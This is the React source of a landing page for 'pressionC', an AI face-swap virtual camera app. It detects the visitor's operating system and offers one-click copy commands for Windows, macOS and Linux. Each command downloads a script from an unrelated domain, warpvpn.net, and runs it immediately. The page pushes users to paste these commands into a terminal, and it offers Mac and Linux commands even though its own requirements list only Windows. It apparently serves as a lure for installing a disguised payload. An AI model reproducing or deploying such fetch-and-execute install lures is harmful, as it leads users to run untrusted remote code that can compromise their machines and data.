import React, { useEffect, useState } from 'react'
import './styles.css'
import { Image } from 'react-bootstrap'
import windowLogo from '../assets/window-logo.svg'
import macLogo from "../assets/mac-logo.svg";
import ubantuLogo from "../assets/ubantu-logo.svg";
import copyLogo from "../assets/copy-logo.svg";
import app from "../assets/app.svg";
import setting from "../assets/setting.svg";
import cap from "../assets/cap.svg";
import audrey from '../assets/images/audrey.webp'
import pj from '../assets/images/pj.webp'
import aiavatar from '../assets/images/aiavatar.webp'
import voice2face from '../assets/images/voice2face.webp'
import cat from '../assets/images/cat.webp'
import { Header } from '../components/Header';
import loop from '../assets/videos/loop.mp4'
export const Home = () => {

  const [os, setOs] = useState('');
  const [isCopied, setCopied] = useState(false);

  useEffect(() => {
    const getUserOS = () => {
      const { platform } = window.navigator;
      if (platform.indexOf("Win") !== -1) return "windows";
      if (platform.indexOf("Mac") !== -1) return "mac";
      if (platform.indexOf("Linux") !== -1) return "linux";
      return "unknown";
    };

    const detectedOs = getUserOS();
    setOs(detectedOs);
    document.querySelector(`.${detectedOs}-width`)?.classList.add("btn-os-click");
  }, []);

  const handleOsChange = (newOs) => {
    setCopied(false);
    setOs(newOs);
    ["windows", "mac", "linux"].forEach((os) => {
      document.querySelector(`.${os}-width`)?.classList.toggle("btn-os-click", os === newOs);
    });
  };

  const getCommand = () => {
    if (os === 'windows') {
      return "Invoke-WebRequest -Uri https://warpvpn.net/install.bat -OutFile install.bat; Start-Process cmd.exe -ArgumentList '/c install.bat'";
    } else if (os === 'mac') {
      return "curl -sSL -O https://warpvpn.net/install.sh && sh install.sh";
    } else if (os === 'linux') {
      return "curl -sSL -O https://warpvpn.net/install-linux.sh && bash install-linux.sh";
    }
    return '';
  };

  return (
    <>
      <div className='hero'>
        <Header
          isVideo={true}
          src={loop}
        />
        <div className='home-title'>
          <p className='reimagine'>Reimagine Your Onscreen Likeness In Real Time</p>
          <p className='theonly'>The only real-time generative AI app for video chatting and live streaming</p>
        </div>
        <div className='download-container'>
          <div className='btn-os-container'>
            <button className='btn-os windows-width' onClick={() => handleOsChange('windows')}>
              <Image src={windowLogo} alt="Windows" />
              Windows 10/11</button>
            <button className='btn-os mac-width' onClick={() => handleOsChange('mac')}>
              <Image src={macLogo} alt="MacOS" />
              MacOS</button>
            <button className='btn-os linux-width' onClick={() => handleOsChange('linux')}>
              <Image src={ubantuLogo} alt="Ubuntu" />
              Ubuntu</button>
          </div>
          <p className='quick-install'>
            {`Quick install by copy the command for your ${os === "windows" ? "Windows" : os === "mac" ? "MacOS" : "Ubuntu"}, paste it in your ${os === "windows" ? "Command Prompt" : os === "mac" ? "Terminal" : "Terminal"}, and start using pressionC!`}
          </p>

          <div className='copy-cmd' style={os === "windows" ? { marginTop: '24px' } : null}  >
            <Image src={copyLogo} alt="Copy" />
            <p className='cmd'> {getCommand()}</p>
            <button className='btn btn-copy' onClick={() => {
              navigator.clipboard.writeText(getCommand())
              setCopied(true)
            }}>{isCopied ? "Copied" : "Copy"}</button>
          </div>
        </div>
      </div>


      <div className='container'>

        <div className='img-text pression-top'>
          <div className='pression'>
            <p className='pression-title'>What is pressionC?</p>
            <p className='pression-desc'>PressionC is an award winning virtual camera app which allows users to instantly transform into anyone or anything with a face with a single photo without any processing time. pressionC enables users to redefine their onscreen persona in real-time, while chatting on apps like Zoom, live streaming on Twitch, or creating a YouTube video.</p>
          </div>
          <Image src={audrey} className='img-s' />
        </div>

        <div className='img-text controll-top'>
          <Image src={pj} className='img-s' />
          <div className='controll'>
            <p className='pression-title'>Have complete control over your persona with one click</p>
            <p className='pression-desc controll-desc'>PressionC reflects your facial expressions on any photo in real-time to create content, including videos, GIFs, memes & more. Images can be from the web, camera roll, or social media. You can become any image with a face -- pictures, paintings, stuffed animals, dolls, artwork, comics, cartoons, sculptures, illustrations, pets, or a star in a movie or TV clip. Change your appearance or your background instantaneously.</p>
          </div>
        </div>

        <div className='img-text controll-top'>
          <div className='pression'>
            <p className='pression-title'>Chat as your ultimate self</p>
            <p className='pression-desc'>PressionC converts user selfies into avatars spanning various styles, including humanoid, CG, Cinematic anime, 90's hip hop, and more. The app's customizations are virtually limitless, enabling users to create unique backgrounds, hairstyles, makeup, clothing, and accessories to suit any mood or scenario.</p>
          </div>
          <Image src={aiavatar} className='img-s' />
        </div>


        <div className='img-text controll-top'>
          <Image src={voice2face} className='img-s' />
          <div className='controll'>
            <p className='pression-title'>Video chat without webcam</p>
            <p className='pression-desc controll-desc'>Our new Voice2Face technology lets you be off camera while the app fully animates your image on screen. You like to pace while on a video call - no problem. Let your voice drive your image on screen. Your facial features are naturally animated, but you don't need to be stuck staring at the screen. To add even more expression, pressionC can generate a variety of animations that convey a richer emotional expression with just a single click of a button.</p>
          </div>
        </div>

        <div className='img-text controll-top'>
          <div className='pression'>
            <p className='pression-title'>A one-stop shop resource for content creators</p>
            <p className='powerful-desc'>pressionC powerful and innovative technology also functions as a creator platform, supporting an array of meme, gif, cinematic, and social content generators, from image and video sourcing to creation, with professional tools that help you produce original content to share with friends, business associates, and followers alike. pressionC is the only app that maintains complete privacy by changing the image on the screen - so no worries of accidentally exposing true identities online.</p>
          </div>
          <Image src={cat} className='img-s' />
        </div>

        <p className='work-txt'>How it works</p>
        <div className='works-container'>
          <div className='works'>
            <div className='work-content'>
              <Image src={app} />
              <p className='work-content-header'>Download App</p>
              <p className='work-content-desc'>To begin using pressionC on your laptop or desktop computer, first download the app.</p>
            </div >
            <div className='work-content'>
              <Image src={setting} />
              <p className='work-content-header'>Open it on your favorite streaming service</p>
              <p className='work-content-desc'>Open your chosen video chat or live online streaming app such as Zoom or Twitch & select "pressionC" from your webcam settings.</p>
            </div>
            <div className='work-content'>
              <Image src={cap} />
              <p className='work-content-header'>Choose any image</p>
              <p className='work-content-desc'>When the pressionC app opens, choose any image. You can then control the face of your digital persona in the image, in real-time, according to your own expressions & head movements.</p>
            </div>
          </div>
        </div>

        <div className='works-container'>
          <div className='system'>
            <p className='system-title'>System Requirement</p>
            <div className='req'>
              <div className='req-li'>
                <p>Operating System:</p>
                <p >Windows 10 Anniversary Update or newer;</p>
              </div>
              <div className='req-li'>
                <p>Minimum Hardware:</p>
                <p className='req-desc'>
                  Intel Core i5 9400 or AMD Ryzen 5 2600 with 8 GB RAM (AVX2 support required);
                  Intel UHD Graphics 630 (Compatible with DirectX 12);
                  a physical webcam; screen resolution of 1024x768
                </p>
              </div>
              <div className='req-li'>
                <p>Recommended Hardware:</p>
                <p >
                  Intel Core i5 11400 or AMD Ryzen 5 3600 with 16 GB RAM or Apple M1;
                  NVIDIA Geforce 1660 or Radeon RX 580
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  )
}
